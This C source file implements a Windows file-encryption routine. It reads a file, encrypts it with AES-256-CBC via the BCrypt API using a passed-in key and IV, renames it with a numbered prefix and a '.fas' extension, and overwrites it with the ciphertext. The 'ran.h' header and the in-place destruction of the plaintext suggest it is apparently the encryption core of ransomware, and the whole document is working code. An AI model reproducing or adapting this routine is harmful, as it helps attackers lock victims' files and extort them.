#include "ran.h"

#define BLOCK_SIZE 16 // AES block size in bytes
#define AES_KEY_SIZE 32 // AES-256 key size in bytes

void file_enc(const char* filename, int number, unsigned char* key, unsigned char* iv) {

	const char* ext = strrchr(filename, '.'); // Find file extension
	if (ext == NULL) {
		printf("No file extension found.\n");
		return;
	}

	size_t extIndex = ext - filename;
	size_t newFilenameSize = extIndex + 6 + strlen(filename) + 1; // number size, '_', '.', NULL character
	char* newFilename = (char*)malloc(newFilenameSize);
	if (newFilename == NULL) {
		printf("Memory allocation for new filename failed.\n");
		return;
	}

	snprintf(newFilename, newFilenameSize, "%d_%s.fas", number, filename); // Create new filename

	FILE* file = fopen(filename, "rb"); // Open file to be encrypted
	if (file == NULL) {
		printf("Failed to open file.\n");
		free(newFilename);
		return;
	}

	fseek(file, 0, SEEK_END);
	long fileSize = ftell(file);
	fseek(file, 0, SEEK_SET);

	BYTE* fileData = (BYTE*)malloc(fileSize);
	if (fileData == NULL) {
		printf("Memory allocation failed.\n");
		fclose(file);
		free(newFilename);
		return;
	}

	size_t bytesRead = fread(fileData, 1, fileSize, file);
	fclose(file);

	if (bytesRead != fileSize) {
		printf("Error reading file.\n");
		free(fileData);
		free(newFilename);
		return;
	}

	DWORD paddingSize = BLOCK_SIZE - (fileSize % BLOCK_SIZE); // Calculate required padding
	DWORD paddedSize = fileSize + paddingSize;

	BYTE* paddedData = (BYTE*)malloc(paddedSize);
	if (paddedData == NULL) {
		printf("Memory allocation for padded data failed.\n");
		free(fileData);
		free(newFilename);
		return;
	}

	memcpy(paddedData, fileData, fileSize); // Copy original data to padded buffer
	memset(paddedData + fileSize, (BYTE)paddingSize, paddingSize); // Add PKCS#7 padding

	BCRYPT_ALG_HANDLE algHandle;
	NTSTATUS status = 0;

	status = BCryptOpenAlgorithmProvider(
		&algHandle,                 // Address of Algorithm Handle
		BCRYPT_AES_ALGORITHM,       // Cryptographic Algorithm Name
		NULL,                       // Not Use
		0);                         // Flags
	if (!NT_SUCCESS(status)) {
		printf("Error getting algorithm handle.\n");
		free(fileData);
		free(paddedData);
		free(newFilename);
		return;
	}
	BCRYPT_KEY_HANDLE keyHandle = NULL;

	status = BCryptGenerateSymmetricKey(
		algHandle,		// Algorithm handle
		&keyHandle,		// A pointer to Key Handle
		NULL,			//
		0,				//
		key,			// A pointer to a buffer that contains the key material
		AES_KEY_SIZE,	// Size of the buffer that contains the key material
		0);				// Flags
	if (!NT_SUCCESS(status)) {
		printf("Error generating symmetric key.\n");
		free(fileData);
		free(paddedData);
		free(newFilename);
		BCryptCloseAlgorithmProvider(algHandle, 0);
		return;
	}

	status = BCryptSetProperty(
		keyHandle,                      // CNG HANDLE
		BCRYPT_CHAINING_MODE,            // Property name 
		(PBYTE)BCRYPT_CHAIN_MODE_CBC,    // Buffer that contains new property value 
		sizeof(BCRYPT_CHAIN_MODE_CBC),   // Size of the buffer that contains new propety value 
		0);                              // Flags 
	if (!NT_SUCCESS(status))
	{
		printf("Error setting chaining mode.\n");
		BCryptDestroyKey(keyHandle);
		free(fileData);
		free(paddedData);
		free(newFilename);
		BCryptCloseAlgorithmProvider(algHandle, 0);
		return;
	}

	DWORD encryptedSize = 0;

	status = BCryptEncrypt( // Calculate ciphertext length
		keyHandle,			// Key handle
		paddedData,			// Address of the plaintext buffer
		paddedSize,			// Size of the plaintext buffer
		NULL,				// A pointer to padding info used with asymmetric encryption
		iv,					// Initialization vector
		BLOCK_SIZE,			// Size of the initialization vector in bytes
		NULL,				// Address of the buffer that receives the ciphertext produced
		0,					// Size of the buffer in bytes
		&encryptedSize,		// Variable that receives the number of bytes copied to the ciphertext buffer
		0);					// Flags
	if (!NT_SUCCESS(status)) {
		printf("Error calculating encrypted size.\n");
		free(fileData);
		free(paddedData);
		free(newFilename);
		BCryptDestroyKey(keyHandle);
		BCryptCloseAlgorithmProvider(algHandle, 0);
		return;
	}

	BYTE* encryptedData = (BYTE*)malloc(encryptedSize); // Free needed
	if (encryptedData == NULL) {
		printf("Memory allocation for encrypted data failed.\n");
		free(fileData);
		free(paddedData);
		free(newFilename);
		BCryptDestroyKey(keyHandle);
		BCryptCloseAlgorithmProvider(algHandle, 0);
		return;
	}

	status = BCryptEncrypt( // Encrypt data
		keyHandle,			// Key handle
		paddedData,			// Address of the plaintext buffer
		paddedSize,			// Size of the plaintext buffer
		NULL,				// A pointer to padding info used with asymmetric encryption
		iv,					// Initialization vector
		BLOCK_SIZE,			// Size of the initialization vector in bytes
		encryptedData,		// Address of the buffer that receives the ciphertext produced
		encryptedSize,		// Size of the buffer in bytes
		&encryptedSize,		// Variable that receives the number of bytes copied to the ciphertext buffer
		0);					// Flags
	if (!NT_SUCCESS(status)) {
		printf("Error encrypting file.\n");
		free(fileData);
		free(paddedData);
		free(encryptedData);
		free(newFilename);
		BCryptDestroyKey(keyHandle);
		BCryptCloseAlgorithmProvider(algHandle, 0);
		return;
	}
	rename(filename, newFilename); // Rename original file

	FILE* encryptedFile = fopen(newFilename, "wb"); // Create encrypted file
	if (encryptedFile == NULL) {
		printf("Failed to create encrypted file.\n");
		free(fileData);
		free(paddedData);
		free(encryptedData);
		free(newFilename);
		BCryptDestroyKey(keyHandle);
		BCryptCloseAlgorithmProvider(algHandle, 0);
		return;
	}

	fwrite(encryptedData, 1, encryptedSize, encryptedFile); // Write encrypted data to file
	fclose(encryptedFile);

	free(fileData);
	free(paddedData);
	free(encryptedData);
	free(newFilename);
	BCryptDestroyKey(keyHandle);
	BCryptCloseAlgorithmProvider(algHandle, 0);
}